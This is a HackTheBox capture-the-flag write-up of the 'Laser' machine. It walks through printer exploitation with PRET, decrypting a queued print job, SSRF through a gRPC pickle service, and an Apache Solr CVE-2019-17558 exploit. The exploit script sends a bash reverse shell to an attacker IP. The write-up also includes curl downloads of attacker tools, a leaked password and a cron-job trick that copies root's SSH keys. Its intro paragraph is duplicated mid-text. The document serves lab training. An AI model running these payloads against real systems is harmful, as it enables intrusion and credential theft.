---
title: "HackTheBox Laser : Insane Machine Writeup"
date: 2022-10-13T19:34:33+05:30
draft: false
toc: true
type: ["posts","post"]
tags: ["Hackthebox","Printer Exploitation", "gRPC", "Internal Port Scanning", "laser"]
---
## Introduction


![Banner](/images/Hackthebox/Laser/banner.jpeg)

Laser Machine is rated as Insane level machine created by [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) & [r4j](https://www.hackthebox.eu/home/users/profile/13243) and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.  

## Enumeration

![NmapScan](/images/Hackthebox/Laser/Nmap.png)

We used -sC for using Defualt script and -sV for Service Version Scan. After Nmap we can see that machine has three running ports that is port 22, port 9000 and port 9100. We know that port 22 is used for SSH and we can also see that in Nmap. Let's search about port 9100 on google to see what this port is for.

### Printer Enumeration

![NmapScan](/images/Hackthebox/Laser/Enumeration_on_9100.png)

Google never leaves our hand! You can see that port 9100 jetdirect is used by printers. Umm Interesting so let's try to exploit printer on machine with PRET. PRET is tool for exploiting vulnerable printers.

This tool uses three different languages to interact with printer i.e PJL,PCL and PostScript. As we are performing pentest on a blackbox, We don't know that which language is being used by the printer so we'll try to use all these languages. Let's try first with PostScript

![PRET](/images/Hackthebox/Laser/PrinterExploit_ps.png)

PostScript is not being used on the Printer as we can that PRET says Command Execution Failed so Let's try with PJL now.

![PRET_PJL](/images/Hackthebox/Laser/PrinterExploit_pjl.png)

PJL worked! LaserCorp LaserJet 4ML is being used here as printer and now we can execute some commands to enumerate about printer. Let's try changing directories

![PRET_DIR](/images/Hackthebox/Laser/PRET_Dir.png)

We found a file called "queued" so let's see contents in file with cat command

![File](/images/Hackthebox/Laser/queued.png)

Seems a big file of base64 encoded string and now we can copy that base64 data to our system into file and then we'll see what type of data it is. Let's enumerate more on printer. Printenv command is available in PRET which shows the enviornment variables of the printer.

![Print_Env](/images/Hackthebox/Laser/PrintEnv.png)

Printenv showed a enviornment variable ENCRYPTION_MODE=AES Yes! This could be useful later. There is one more option called NVRAM can be used to dump the memory and maybe this memory could be useful

![NVRAM_DUMP](/images/Hackthebox/Laser/nvram_dump.png)

Laser Machine is rated as Insane level machine created by [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) & [r4j](https://www.hackthebox.eu/home/users/profile/13243) and was released on HackTheBox Platform. This machine is based on exposed features of Printer to gain initial foothold.  

```bash
sed -e "s#'##g" queued | cut -c2- > queued.b6
```
## Gaining User Access

### Decrypting AES

Now we have used sed (stream editor for filtering) to convert raw file to proper base64 and now let's try to decrypt AES now with this file
```python
from Crypto.Cipher import AES
import base64,struct

with open("queued.b64","rb") as data:
    data = data.read().strip()
    data = base64.b64decode(data)
    size, iv,ciphertext = (data[0:8],data[8:24],data[24:])
    key = "13vu94r6643rv19u".encode()
    cipher = AES.new(key,AES.MODE_CBC,iv)
    decrypted = cipher.decrypt(ciphertext)
    with open("decrypted","wb") as output:
        output.write(decrypted)
```
### gRPC Interaction
AES got decrypted and now we have a PDF Documentation about Feed Engine v1.0 so let's see what hints we can get from there

![Doc](/images/Hackthebox/Laser/Documentation.png)

Points to notice :
```
Engine runs on 9000 Port which we got from nmap
Uses gRPC for Interaction
Protobuf (Google Protocol Buffer) are used with gRPC

```

For interaction with service we have to understand the message structure first and gRPC [documentation](https://grpc.io/docs/what-is-grpc/introduction/) comes in handy here.Let's read decrypted PDF more and There is a sample code as well in pdf and some more hints!!

![Service](/images/Hackthebox/Laser/Service.png)

As per documentation we have to create a service called **Print** with method **Feed** which takes parameter **Content** as input and **Data** as output
```python
syntax = "proto3";
service Print{
    rpc Feed (Content) returns (Data) {}
}
```
Now we have to define **Content** and **Data**. **Content** holds memeber called **data** and **Data** holds feed.

```python
syntax = "proto3";
service Print{
    rpc Feed (Content) returns (Data) {}
}
message Content{
    string data=1;
}
message Data{
    string feed=1;
}
```

Now we have to save this data in a file laser.proto . Now we have to use python to interact with Service

```python
pip3 install grpcio-tools
pip3 install grpcio
```
Once we have installed both modules, We have to generate gRPC classes for python

```python
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
```
Let's create a python script to interact with gRPC

```python
import grpc
import laser_pb2
import laser_pb2_grpc
channel = grpc.insecure_channel("10.10.10.201:9000")
stub = laser_pb2_grpc.PrintStub(channel)
data = stub.Feed(laser_pb2.Content(data = "abcde"))
print(data.feed)
```
We have created a server using **insecure_channel**, PrintStub to invoke methods, Feed is stub object and we call it using**Feed**and We sent input **using Content** with data and returned **Data** using **feed**. 

![base64_err](/images/Hackthebox/Laser/base64_error.png)

We got error which says **Invalid base64-encoded string** means the gRPC requieres base64 string in order to communicate with service. Let's change string to base64

```python
data = stub.Feed(laser_pb2.Content(data = "YWJjZGU="))
```

![unpickle](/images/Hackthebox/Laser/unpickle.png)

Now the error says that **unpickling stack underflow** it means the gRPC doesn't accept unpickled (desearialized) objects so we can use pickle method to serialize the objects.

```python
import sys, pickle, base64
import grpc, laser_pb2, laser_pb2_grpc

payload = '{"feed_url":"http://10.10.14.12:1337"}'
payload = base64.b64encode(pickle.dumps(payload))
channel = grpc.insecure_channel('10.10.10.201:9000')
stub = laser_pb2_grpc.PrintStub(channel)
content = laser_pb2.Content(data=payload)
try:
    response = stub.Feed(content, timeout=10)
    print(response)
except Exception as ex:
    print(ex)
```
Run this python file and listen to 1337 on another terminal

![Reply_NC](/images/Hackthebox/Laser/Reply_from_nc.png)

Now we are reciveing connection from the machine! Now we have to create another python script which will be basic port scanner so that we can scan internal ports from the machine network.

```python
import sys, pickle, base64
import grpc, laser_pb2, laser_pb2_grpc

for port in range(1, 65536):
    payload = '{"feed_url":"http://localhost:' + str(port) + '"}'
    payload = base64.b64encode(pickle.dumps(payload))
    channel = grpc.insecure_channel('10.10.10.201:9000')
    stub = laser_pb2_grpc.PrintStub(channel)
    content = laser_pb2.Content(data=payload)
    try:
        response = stub.Feed(content, timeout=10)
        print(port, response)
    except Exception as ex:
        if 'Connection refused' in ex.details():
            continue
        print(port)
```
![Internal_Port_Scan](/images/Hackthebox/Laser/PortScan.png)

We have enumerated 2 Internal Ports :
```python
7983
8983 feed: "Pushing feeds"
```
### Apache Solr RCE
Port 8983 uses Apache Solr RCE [Exploit](https://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py)

So we are going to use a exploit coded in python for getting reverse shell by exploiting the CVE-2019-17558

```python
import sys,pickle,base64,subprocess

payload = 'bash -c {echo,' + base64.b64encode("bash -i >& /dev/tcp/10.10.14.12/4444 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}'

def send_url(url):
  feed_url = '{"feed_url": "gopher://localhost:8983/_' + url + '"}'
  print(feed_url)
  feed_url_b64 = base64.b64encode(pickle.dumps(feed_url))
  cmd = './grpcurl -max-time 5 -plaintext -proto laser.proto -d \'{"data":"' + feed_url_b64 + '"}\' 10.10.10.201:9000 Print.Feed'
  subprocess.call(cmd,shell=True)


def enc(data):
  return str(data.replace('%','%25').replace('\n','%0d%0a').replace('"','\\"'))

def url_get(header,req):
  send_url(enc(req) + enc(header))

def url_post(header,body):
  send_url(enc(header) + "%0d%0a%0d%0a" + enc(body)) 

  
body = """
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}""".strip().replace('\n','').replace(' ','')

header = """
POST /solr/staging/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: {}
""".format(len(body)).strip()

url_post(header,body)


header = ' HTTP/1.1\nHost: localhost:8983\n'
template = '%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec("PAYLOAD"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
req = 'GET /solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=' + template.replace('PAYLOAD',payload).replace(' ','%20')

url_get(header,req)
```

![RevShell](/images/Hackthebox/Laser/RevShell.png)
BOOM! We got user shell :)
Let's enumerate the system for priviledge escalation.

## Getting Root

The current shell is not much stable so let's add our ssh keys into authorized_keys for solr and
Now Let's upload [PsPy](https://github.com/DominicBreuker/pspy) to machine using curl. Pspy snoops processes without root permisson.

```python
python -m SimpleHTTPServer 80 #on attacker machine
curl http://10.10.14.12/pspy64 -o pspy64 #on victim machine
chmod +x pspy64 #on victim machine
```

![DockerPass](/images/Hackthebox/Laser/Docker_Pass.png)

We got a passoword for root!! but it is running /tmp/clear.sh on root, something is suspicous here. Let's see what is it.

```python
sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2
```

```

![Docker_login](/images/Hackthebox/Laser/Docker_Login.png)

This is not root!!! This is docker 
So Now as it is executing the /tmp/clear.sh then we can redirect the ssh back again to us.


```python
curl http://10.10.14.12/socat -o socat #on solr shell
chmod +x socat #on solr shell
cd tmp #on solr shell
service ssh stop #on docker
./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22 #on docker
```
After doing this we have to change the ownership rights so that we could copy the id_rsa of root to our solr use 

```python
cd /tmp
echo 'mkdir -p /tmp/purabparihar;cp -R /root/.ssh /tmp/purabparihar;chown -R solr:solr /tmp/purabparihar'> /tmp/clear.sh;chmod +x /tmp/clear.sh
```
Now keep spamming ls command because the cron job could be executed any time. 

![Cron](/images/Hackthebox/Laser/Cron.png)
Once we got folder named purabparihar then we have grab ssh keys from root!!

```python

ls;cd purabparihar/.ssh;cat id_rsa

```
Now copy those ssh keys and then save it in file

```python
chmod 600 root_ssh
ssh -i root_ssh root@laser.htb

```

![Root](/images/Hackthebox/Laser/root.png)

**Thank You Everyone for reading this blog! I hope you learned something new**